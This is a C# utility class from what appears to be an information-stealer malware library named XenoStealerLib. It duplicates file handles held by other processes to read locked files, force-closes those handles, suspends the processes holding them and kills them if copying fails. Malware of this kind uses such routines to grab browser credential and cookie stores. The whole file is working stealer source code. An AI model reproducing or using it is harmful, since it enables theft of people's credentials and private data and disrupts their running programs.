using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealerLib.Utils
{
    public static class FileLockBypasser
    {

        public static void AggresiveFileCopy(string fileToCopy, string whereToCopyTo, bool overwrite = false)
        {
            try
            {
                File.Copy(fileToCopy, whereToCopyTo, overwrite);
            }
            catch
            {
                List<int> ListOfPidsLockingFile = FileLockInfo.GetProcessesIdsLockingFile(fileToCopy);
                List<int> FrozenPids = new List<int>();
                foreach (int pid in ListOfPidsLockingFile)
                {
                    int ParentPid = ParentProcessUtil.GetParentProcessId(pid);
                    if (ParentPid == 0)
                    {
                        ParentPid = pid;
                    }
                    if (SimpleProcessStuff.GetProcessName(ParentPid).ToLower() != "explorer")
                    {
                        ProcessPauser.Pause(ParentPid);
                        FrozenPids.Add(ParentPid);
                    }
                    CloseFileHandlesFromPid(pid, fileToCopy);
                }
                bool worked = true;
                try
                {
                    File.Copy(fileToCopy, whereToCopyTo, overwrite);
                }
                catch
                {
                    worked = false;
                }
                foreach (int frozen_pid in FrozenPids)
                {
                    ProcessPauser.Resume(frozen_pid);
                }
                foreach (int pid in ListOfPidsLockingFile)
                {
                    int ParentPid = ParentProcessUtil.GetParentProcessId(pid);
                    if (ParentPid == 0)
                    {
                        ParentPid = pid;
                    }
                    if (!worked)
                    {
                        SimpleProcessStuff.Kill(ParentPid);
                    }
                }
                if (!worked)
                {
                    File.Copy(fileToCopy, whereToCopyTo, overwrite);
                }
            }
        }

        public static byte[] HijackAndReadLockedFile(string path)
        {
            byte[] output = null;
            try
            {
                output = File.ReadAllBytes(path);
            }
            catch { }


            if (output != null)
            {
                return output;
            }

            List<int> ListOfPidsLockingFile = FileLockInfo.GetProcessesIdsLockingFile(path);
            foreach (int pid in ListOfPidsLockingFile)
            {
                output = HijackAndReadFileHandleFromPid(pid, path);
                if (output != null)
                {
                    break;
                }
            }

            return output;
        }


        public static byte[] HijackAndReadFileHandleFromPid(int pid, string filepath) 
        {
            uint dwSize = 0;
            uint status = 0;
            uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;
            uint PROCESS_DUP_HANDLE = 0x0040;
            uint DUPLICATE_SAME_ACCESS = 0x00000002;
            uint PAGE_READONLY = 0x02;
            uint FILE_MAP_READ = 0x04;
            IntPtr pInfo = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(SYSTEM_HANDLE_INFORMATION)));
            do
            {
                status = NativeMethods.NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS.SystemHandleInformation, pInfo, dwSize, out dwSize);
                if (status == STATUS_INFO_LENGTH_MISMATCH)
                {
                    pInfo = Marshal.ReAllocHGlobal(pInfo, (IntPtr)dwSize);
                }
                else if (status != 0) 
                {
                    Marshal.FreeHGlobal(pInfo);
                    return null;
                }
            } while (status != 0);

            uint payloadSize = Marshal.PtrToStructure<UintResult>(pInfo).Value;
            int structSize = Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
            int offset = IntPtr.Size - structSize;//subtracting so we can put the add offset at the top, makes using continue within the for loop nice
            IntPtr localProcessFileHandle = IntPtr.Zero;
            IntPtr ProcHandle = IntPtr.Zero;
            byte[] result = null;
            
            for (long i = 0; i < payloadSize; i++)
            {
                if (localProcessFileHandle != IntPtr.Zero) 
                {
                    NativeMethods.CloseHandle(localProcessFileHandle);
                    localProcessFileHandle = IntPtr.Zero;
                }
                if (ProcHandle != IntPtr.Zero) 
                {
                    NativeMethods.CloseHandle(ProcHandle);
                    ProcHandle = IntPtr.Zero;
                }
                if (result != null) 
                {
                    break;
                }
                offset += structSize;
                SYSTEM_HANDLE_TABLE_ENTRY_INFO data = Marshal.PtrToStructure<SYSTEM_HANDLE_TABLE_ENTRY_INFO>(pInfo + offset);
                if (data.UniqueProcessId == pid)
                {
                    IntPtr localHandle = (IntPtr)data.HandleValue;
                    ProcHandle = NativeMethods.OpenProcess(PROCESS_DUP_HANDLE, false, data.UniqueProcessId);
                    if (ProcHandle == IntPtr.Zero)
                    {
                        continue;
                    }

                    localProcessFileHandle = IntPtr.Zero;
                    if (!NativeMethods.DuplicateHandle(ProcHandle, localHandle, NativeMethods.GetCurrentProcess(), ref localProcessFileHandle, 0, false, DUPLICATE_SAME_ACCESS) || localProcessFileHandle == IntPtr.Zero)
                    {
                        continue;
                    }

                    if (NativeMethods.GetFileType(localProcessFileHandle) != FileType.FILE_TYPE_DISK)
                    {
                        continue;
                    }
                    StringBuilder HandleFilename = new StringBuilder(1024);
                    uint PathLength = NativeMethods.GetFinalPathNameByHandle(localProcessFileHandle, HandleFilename, (uint)HandleFilename.Capacity, 0);
                    if (PathLength == 0)
                    {
                        continue;
                    }

                    string handleFilepath = HandleFilename.ToString();
                    if (handleFilepath.StartsWith(@"\\?\"))
                    {
                        handleFilepath = handleFilepath.Substring(4);
                    }

                    if (handleFilepath == filepath)
                    {
                        IntPtr FileMap = NativeMethods.CreateFileMapping(localProcessFileHandle, IntPtr.Zero, PAGE_READONLY, 0, 0, null);
                        if (FileMap == IntPtr.Zero) 
                        {
                            continue;
                        }

                        bool gotFileSize = NativeMethods.GetFileSizeEx(localProcessFileHandle, out ulong FileSize);
                        if (!gotFileSize) 
                        {
                            NativeMethods.CloseHandle(FileMap);
                            continue;
                        }
                        IntPtr FileDataAddress = NativeMethods.MapViewOfFile(FileMap, FILE_MAP_READ, 0, 0, (uint)FileSize);
                        if (FileDataAddress == IntPtr.Zero) 
                        {
                            NativeMethods.CloseHandle(FileMap);
                            continue;
                        }
                        byte[] FileData = new byte[FileSize];
                        try
                        {
                            Marshal.Copy(FileDataAddress, FileData, 0, (int)FileSize);
                        }
                        catch 
                        {
                            NativeMethods.CloseHandle(FileMap);
                            NativeMethods.UnmapViewOfFile(FileDataAddress);
                            continue;
                        }
                        NativeMethods.UnmapViewOfFile(FileDataAddress);
                        NativeMethods.CloseHandle(FileMap);
                        result = FileData;
                    }

                }

            }
            Marshal.FreeHGlobal(pInfo);
            return result;
        }

        public static void CloseFileHandlesFromPid(int pid, string filepath) 
        {
            uint dwSize = 0;
            uint status = 0;
            uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;
            uint PROCESS_DUP_HANDLE = 0x0040;
            uint DUPLICATE_SAME_ACCESS = 0x00000002;
            uint DUPLICATE_CLOSE_SOURCE = 0x00000001;
            IntPtr pInfo = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(SYSTEM_HANDLE_INFORMATION)));
            do
            {
                status = NativeMethods.NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS.SystemHandleInformation, pInfo, dwSize, out dwSize);
                if (status == STATUS_INFO_LENGTH_MISMATCH)
                {
                    pInfo = Marshal.ReAllocHGlobal(pInfo, (IntPtr)dwSize);
                }
            } while (status != 0);

            int payloadSize = (int)Marshal.ReadIntPtr(pInfo);
            int structSize = Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
            int offset = IntPtr.Size-structSize;//subtracting so we can put the add offset at the top, makes using continue within the for loop nic
            for (int i = 0; i < payloadSize; i++)
            {
                offset += structSize;
                SYSTEM_HANDLE_TABLE_ENTRY_INFO data = Marshal.PtrToStructure<SYSTEM_HANDLE_TABLE_ENTRY_INFO>(pInfo + offset);
                if (data.UniqueProcessId == pid)
                {
                    IntPtr localHandle = (IntPtr)data.HandleValue;
                    IntPtr ProcHandle = NativeMethods.OpenProcess(PROCESS_DUP_HANDLE, false, data.UniqueProcessId);
                    if (ProcHandle == IntPtr.Zero) 
                    {
                        continue;
                    }

                    IntPtr localProcessFileHandle = IntPtr.Zero;
                    if (!NativeMethods.DuplicateHandle(ProcHandle, localHandle, NativeMethods.GetCurrentProcess(), ref localProcessFileHandle, 0, false, DUPLICATE_SAME_ACCESS) || localProcessFileHandle == IntPtr.Zero) 
                    {
                        NativeMethods.CloseHandle(ProcHandle);
                        continue;
                    }

                    if (NativeMethods.GetFileType(localProcessFileHandle) != FileType.FILE_TYPE_DISK) 
                    {
                        NativeMethods.CloseHandle(localProcessFileHandle);
                        NativeMethods.CloseHandle(ProcHandle);
                        continue;
                    }
                    StringBuilder HandleFilename = new StringBuilder(1024);
                    uint PathLength=NativeMethods.GetFinalPathNameByHandle(localProcessFileHandle, HandleFilename, (uint)HandleFilename.Capacity, 0);
                    if (PathLength == 0) 
                    {
                        NativeMethods.CloseHandle(localProcessFileHandle);
                        NativeMethods.CloseHandle(ProcHandle);
                        continue;
                    }

                    string handleFilepath = HandleFilename.ToString();
                    if (handleFilepath.StartsWith(@"\\?\"))
                    {
                        handleFilepath = handleFilepath.Substring(4);
                    }
                    
                    NativeMethods.CloseHandle(localProcessFileHandle);
                    if (handleFilepath == filepath) 
                    {
                        if (!NativeMethods.DuplicateHandle(ProcHandle, localHandle, NativeMethods.GetCurrentProcess(), ref localProcessFileHandle, 0, false, DUPLICATE_CLOSE_SOURCE) || localProcessFileHandle == IntPtr.Zero)
                        {
                            NativeMethods.CloseHandle(ProcHandle);
                            continue;
                        }
                        NativeMethods.CloseHandle(localProcessFileHandle);
                    }

                }
                
            }
            Marshal.FreeHGlobal(pInfo);
        }
    }
}
